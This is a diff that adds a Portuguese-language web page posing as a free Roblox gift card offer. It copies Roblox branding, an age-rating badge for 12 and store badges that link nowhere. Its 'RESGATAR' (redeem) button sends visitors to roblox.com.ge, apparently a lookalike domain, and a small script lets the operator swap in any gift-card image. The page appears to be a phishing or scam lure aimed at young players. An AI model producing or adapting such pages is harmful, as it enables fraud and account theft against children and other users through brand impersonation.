@@ -1,0 +1,125 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Gift Card - Roblox</title>
+<style>
+  :root{
+    --bg:#0b0b0b;
+    --card:#0f0f0f;
+    --muted:#cfcfcf;
+    --accent:#e6e6e6;
+    --glass: rgba(255,255,255,0.06);
+    --radius:18px;
+    --shadow: 0 10px 30px rgba(0,0,0,0.6);
+    font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+  }
+  html,body{height:100%; margin:0; background:var(--bg); color:var(--accent);}
+  .bg-grid{
+    position:fixed; inset:0; z-index:0;
+    background:
+      radial-gradient(circle at 10% 10%, rgba(255,255,255,0.02), transparent 10%),
+      linear-gradient(180deg, rgba(255,255,255,0.01), rgba(0,0,0,0.02));
+    display:grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap:12px;
+    padding:36px;
+    box-sizing:border-box;
+    opacity:0.85;
+    filter: blur(6px) saturate(120%);
+  }
+  .bg-grid img{ width:100%; height:160px; object-fit:cover; border-radius:12px; display:block; box-shadow: inset 0 0 40px rgba(0,0,0,0.4);}
+  main{
+    position:relative; z-index:2;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:36px;
+  }
+  .wrapper{width:100%; max-width:420px; text-align:center;}
+  .header{display:flex; justify-content:space-between; align-items:center; color:var(--muted); margin-bottom:14px; font-weight:600;}
+  .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border-radius:20px; padding:18px; box-shadow: var(--shadow); border: 1px solid rgba(255,255,255,0.04);}
+  .gift-visual{background:var(--glass); border-radius:16px; padding:22px; display:flex; align-items:center; justify-content:center; height:220px; margin-bottom:18px;}
+  .gift-visual img{max-width:86%; max-height:100%; border-radius:10px; box-shadow: 0 6px 18px rgba(0,0,0,0.6); background:linear-gradient(180deg,#fff,#f3f3f3); padding:8px;}
+  .cta{margin-top:6px; display:flex; gap:12px; align-items:center; justify-content:center; flex-direction:column;}
+  .btn-resgatar{width:100%; background:linear-gradient(180deg,#d7d7d7,#bfbfbf); color:#000; font-weight:800; letter-spacing:1px; padding:14px 12px; font-size:26px; border-radius:10px; border: 3px solid rgba(0,0,0,0.25); text-decoration:none; box-shadow: inset 0 -4px 0 rgba(0,0,0,0.12);}
+  .rating{background:#000; margin:14px auto 8px; display:inline-flex; align-items:center; gap:10px; padding:12px 16px; border-radius:10px; color:var(--accent); font-weight:700; box-shadow: 0 8px 24px rgba(0,0,0,0.6);}
+  .rating .age{background:#ffd24b; color:#000; font-weight:900; padding:6px 10px; border-radius:6px; font-size:20px;}
+  .rating .desc{font-size:12px; color:var(--muted); text-align:left; line-height:1.05;}
+  .stores{display:flex; gap:12px; margin-top:14px; justify-content:center; flex-wrap:wrap;}
+  .store-btn{display:inline-flex; align-items:center; gap:10px; padding:8px 12px; border-radius:10px; background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.12)); border:1px solid rgba(255,255,255,0.04); text-decoration:none; color:var(--accent); font-weight:700; min-width:160px; justify-content:center;}
+  .store-btn svg{height:28px;}
+  .footer-note{margin-top:18px; color:var(--muted); font-size:12px;}
+  @media (max-width:420px){
+    .bg-grid img{ height:110px; }
+    .gift-visual{ height:180px; padding:14px; }
+    .btn-resgatar{ font-size:22px; padding:12px; }
+  }
+</style>
+</head>
+<body>
+  <div class="bg-grid" aria-hidden="true">
+    <img src="https://images.unsplash.com/photo-1505740420928-5e560c06d30e?q=80&w=800&auto=format&fit=crop&ixlib=rb-4.0.3&s=1" alt="">
+    <img src="https://images.unsplash.com/photo-1533587851505-8e9f6a1b8f1b?q=80&w=800&auto=format&fit=crop&ixlib=rb-4.0.3&s=2" alt="">
+    <img src="https://images.unsplash.com/photo-1520975917284-4b4d2a5f3f26?q=80&w=800&auto=format&fit=crop&ixlib=rb-4.0.3&s=3" alt="">
+    <img src="https://images.unsplash.com/photo-1519125323398-675f0ddb6308?q=80&w=800&auto=format&fit=crop&ixlib=rb-4.0.3&s=4" alt="">
+    <img src="https://images.unsplash.com/photo-1549880338-65ddcdfd017b?q=80&w=800&auto=format&fit=crop&ixlib=rb-4.0.3&s=5" alt="">
+    <img src="https://images.unsplash.com/photo-1472214103451-9374bd1c798e?q=80&w=800&auto=format&fit=crop&ixlib=rb-4.0.3&s=6" alt="">
+  </div>
+
+  <main>
+    <div class="wrapper">
+      <div class="header">
+        <div>GIFT CARD</div>
+        <div style="font-weight:800;">GIFT CARD</div>
+      </div>
+
+      <div class="card" role="region" aria-label="Gift card">
+        <div class="gift-visual">
+          <!-- imagem do giftcard -->
+          <img id="giftImg" src="https://i.imgur.com/iYaBjmj.png" alt="Roblox giftcard">
+        </div>
+
+        <div class="cta">
+          <a id="resgatarBtn" class="btn-resgatar" href="https://roblox.com.ge/communities/4818794559/" target="_blank" role="button">RESGATAR</a>
+
+          <div class="rating" title="Classificação indicativa">
+            <div class="age">12</div>
+            <div class="desc">
+              <div style="font-weight:700; color:var(--accent);">Violência</div>
+              <div style="font-size:11px; color:var(--muted)">Interação entre usuários • Compras no jogo</div>
+            </div>
+          </div>
+
+          <div class="stores" aria-hidden="true">
+            <a class="store-btn" href="#" target="_blank" rel="noopener">
+              <svg viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+                <path d="M16 1L8 7v10l8 6V1z" fill="currentColor" opacity="0.95"/>
+              </svg>
+              <span>Download on the<br><strong>App Store</strong></span>
+            </a>
+
+            <a class="store-btn" href="#" target="_blank" rel="noopener">
+              <svg viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+                <path d="M3 2v20l15-10L3 2z" fill="currentColor" opacity="0.95"/>
+              </svg>
+              <span>GET IT ON<br><strong>Google Play</strong></span>
+            </a>
+          </div>
+
+          <div class="footer-note">Caso Não Caia Chame O Suporte</div>
+        </div>  
+      </div>
+    </div>
+  </main>
+
+<script>
+  document.getElementById('giftImg').addEventListener('click', ()=> {
+    const url = prompt('Cole a URL da imagem do Gift Card:');
+    if(url) document.getElementById('giftImg').src = url;
+  });
+</script>
+</body>
+</html>
